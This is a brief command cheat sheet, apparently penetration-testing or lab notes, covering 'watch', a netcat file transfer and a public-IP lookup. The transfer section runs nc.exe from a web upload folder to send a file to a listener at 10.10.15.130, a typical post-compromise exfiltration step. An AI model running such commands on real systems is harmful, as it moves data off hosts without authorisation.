

## Watch
```
watch -n 0.5 -d ls -la
```

## Transfer file windows ---> linux
```
win    : C:\xampp\htdocs\gym\upload\nc.exe 10.10.15.130 5555 < CloudMe_1112.exe
linux  : nc -nlvp 5555 > CloudMe_1112.exe
```

## Find public ip
```
dig +short myip.opendns.com @resolver1.opendns.com
```
